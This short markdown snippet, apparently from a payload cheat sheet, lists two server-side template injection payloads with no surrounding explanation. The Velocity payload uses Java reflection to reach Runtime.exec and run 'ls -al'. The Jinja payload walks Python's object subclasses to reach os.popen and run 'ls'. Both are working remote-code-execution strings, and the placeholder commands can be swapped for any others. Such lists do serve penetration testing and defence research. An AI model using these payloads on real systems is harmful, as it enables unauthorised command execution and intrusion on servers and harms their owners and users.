#### Velocity template Langauge payload:

```
#set($engine="string")#set($run=$engine.getClass().forName("java.lang.Runtime"))#set($runtime=$run.getRuntime())#set($proc=$runtime.exec("ls -al"))#set($null=$proc.waitFor())#set($istr=$proc.getInputStream())#set($chr=$engine.getClass().forName("java.lang.Character"))#set($output="")#set($string=$engine.getClass().forName("java.lang.String"))#foreach($i in [1..$istr.available()])#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))#end$output
```

#### Jinja payload <i>(Python)</i> : 

```py
 ''.__class__.__base__.__subclasses__()[103].__init__.__globals__['sys'].modules['os'].popen("ls").read()
 ```
